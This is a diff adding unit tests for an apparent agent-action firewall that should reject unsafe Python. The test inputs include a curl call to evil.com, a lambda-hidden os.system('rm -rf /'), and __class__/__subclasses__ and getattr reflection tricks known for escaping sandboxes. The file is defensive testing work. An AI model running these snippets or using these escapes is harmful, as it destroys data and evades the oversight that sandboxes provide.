@@ -108,3 +108,59 @@ class TestActionFirewall:
             "import os\nos.system('curl http://evil.com')"
         )
         assert safe is False
+
+    def test_builtin_input_blocked(self) -> None:
+        """Interactive I/O stalls the sandbox — block input()."""
+        safe, reason = verify_agent_action(
+            "name = input('password: ')\nprint(name)"
+        )
+        assert safe is False
+        assert "Interactive I/O" in reason
+
+    def test_builtins_input_aliased_blocked(self) -> None:
+        """import builtins; builtins.input('...') must also be blocked."""
+        safe, reason = verify_agent_action(
+            "import builtins\nbuiltins.input('hi')"
+        )
+        assert safe is False
+
+    def test_breakpoint_blocked(self) -> None:
+        """breakpoint() drops into pdb — unacceptable in a sandbox."""
+        safe, reason = verify_agent_action("breakpoint()")
+        assert safe is False
+
+    def test_lambda_hiding_import_blocked(self) -> None:
+        """Banned calls hidden inside a lambda body must still be caught."""
+        safe, reason = verify_agent_action(
+            "f = lambda: __import__('os').system('rm -rf /')\nf()"
+        )
+        assert safe is False
+
+    def test_dunder_class_chain_blocked(self) -> None:
+        """The classic __class__.__bases__.__subclasses__ escape is blocked."""
+        safe, reason = verify_agent_action(
+            "bases = ''.__class__.__bases__"
+        )
+        assert safe is False
+        assert "__class__" in reason or "__bases__" in reason
+
+    def test_subclasses_reflection_blocked(self) -> None:
+        """Walking object.__subclasses__() is a known sandbox escape."""
+        safe, reason = verify_agent_action(
+            "subs = object.__subclasses__()"
+        )
+        assert safe is False
+
+    def test_getattr_dunder_blocked(self) -> None:
+        """getattr(x, '__class__') is the string-form of the dunder chain."""
+        safe, reason = verify_agent_action(
+            "k = getattr('', '__class__')"
+        )
+        assert safe is False
+
+    def test_getattr_input_blocked(self) -> None:
+        """Reflection onto input() is blocked too."""
+        safe, reason = verify_agent_action(
+            "fn = getattr(__builtins__, 'input')"
+        )
+        assert safe is False
